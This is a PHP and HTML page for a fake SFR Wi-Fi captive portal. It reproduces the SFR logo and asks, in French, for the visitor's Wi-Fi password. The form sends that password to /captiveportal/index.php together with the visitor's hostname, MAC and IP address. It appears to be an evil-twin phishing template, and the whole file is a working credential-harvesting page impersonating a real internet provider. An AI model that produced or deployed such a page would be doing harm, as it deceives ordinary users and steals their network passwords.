<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <title>SFR - Wi-Fi</title>
    <link href='assets/css/bootstrap.min.css' rel="stylesheet">
    <link href='assets/css/progress-bar.css' rel="stylesheet">
    <link href='assets/css/custom.css' rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #F5F5F5;
        }
        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        #logo {
            text-align: center;
            margin-bottom: 20px;
        }
        h1, h2 {
            text-align: center;
            margin: 10px 0;
        }
        h1 {
            font-size: 24px;
            color: #333;
        }
        h2 {
            font-size: 16px;
            color: #555;
        }
        input, button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            background-color: #c00404;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #D90D25;
        }
    </style>
</head>
<body>
    <div class="container">
      <div id="logo">
        <svg
           xmlns:dc="http://purl.org/dc/elements/1.1/"
           xmlns:cc="http://creativecommons.org/ns#"
           xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
           xmlns:svg="http://www.w3.org/2000/svg"
           xmlns="http://www.w3.org/2000/svg"
           xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd"
           xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"
           width="100"
           viewBox="0 0 1000 1000.0004"
           version="1.1"
           id="svg6"
           sodipodi:docname="SFR.svg"
           style="fill:none"
           inkscape:version="0.92.4 (5da689c313, 2019-01-14)">
          <metadata
             id="metadata12">
            <rdf:RDF>
              <cc:Work
                 rdf:about="">
                <dc:format>image/svg+xml</dc:format>
                <dc:type
                   rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
                <dc:title></dc:title>
              </cc:Work>
            </rdf:RDF>
          </metadata>
          <defs
             id="defs10" />
          <sodipodi:namedview
             pagecolor="#ffffff"
             bordercolor="#111111"
             borderopacity="1"
             objecttolerance="10"
             gridtolerance="10"
             guidetolerance="10"
             inkscape:pageopacity="0"
             inkscape:pageshadow="2"
             inkscape:window-width="1920"
             inkscape:window-height="1017"
             id="namedview8"
             showgrid="false"
             fit-margin-top="0"
             fit-margin-left="0"
             fit-margin-right="0"
             fit-margin-bottom="0"
             inkscape:zoom="0.47408296"
             inkscape:cx="193.3321"
             inkscape:cy="93.488187"
             inkscape:window-x="1912"
             inkscape:window-y="-8"
             inkscape:window-maximized="1"
             inkscape:current-layer="svg6" />
          <path
             d="M 999.99998,0 H 0 v 1000.0004 h 999.99998 z"
             id="path2"
             inkscape:connector-curvature="0"
             style="fill:#e2001a;stroke-width:22.72728157" />
          <path
             d="M 494.39069,646.93437 V 337.82515 h 188.95236 v 48.82502 H 545.26344 v 84.66822 h 118.88642 v 47.97956 H 545.26344 v 127.63642 z m 403.44336,0 -69.14549,-124.46142 H 777.04081 V 646.93437 H 726.17034 V 337.82515 h 114.16141 c 45.93184,0 107.2455,12.91137 107.2455,89.81822 0,52.28411 -27.09319,76.48412 -69.8523,87.77276 l 80.36594,131.51824 H 897.69314 Z M 834.12266,476.25702 c 46.07274,0 60.53638,-19.68409 60.53638,-49.17729 0,-19.47501 -8.74773,-43.60456 -58.77275,-43.60456 h -58.77502 v 92.78185 z M 326.39517,459.25247 c -36.68866,-10.3 -40.9932,-29.63183 -40.9932,-42.19093 0,-23.99091 18.55682,-40.07729 52.00002,-40.07729 23.07274,0 43.46365,9.87728 58.35002,29.56365 l 40.28866,-23.49546 c -19.54319,-28.71592 -49.81366,-52.63639 -98.77959,-52.63639 -57.78639,0 -105.20005,35.91365 -105.20005,88.90231 0,52.98866 44.80457,75.91822 92.5705,89.32504 0,0 21.94319,6.35 22.15455,6.42046 40.9932,10.79546 44.1682,29.35228 44.1682,45.3682 0,29.27956 -30.69092,47.41366 -57.22047,47.41366 -26.52956,0 -49.74321,-9.10228 -67.59322,-40.78184 l -40.28865,23.98865 c 26.10683,44.87502 57.43412,63.15002 108.16368,63.15002 55.9523,0 110.06823,-42.68865 110.06823,-96.02958 0,-63.14776 -51.22275,-80.99776 -95.53413,-92.50004 -0.21136,0 -22.0841,-6.35 -22.0841,-6.35 z"
             id="path4"
             inkscape:connector-curvature="0"
             style="fill:#ffffff;stroke-width:22.72728157" />
        </svg>
      </div>
        <h1>Connexion</h1>
        <h2>Saisissez le mot de passe de votre Wi-Fi pour continuer</h2>
        <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()">
            <input name="email" type="hidden" value="bbox@exemple.com" required>
            <input name="password" id='password-input' type="password" placeholder="Mot de passe" required>
            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <button type="submit">Suivant</button>
        </form>
    </div>
    <script src='assets/js/jquery-3.4.1.min.js'></script>
    <script src='assets/js/bootstrap.min.js'></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location.href = "/captiveportal/index.php";
            }, 100);
        }
    </script>
</body>
</html>
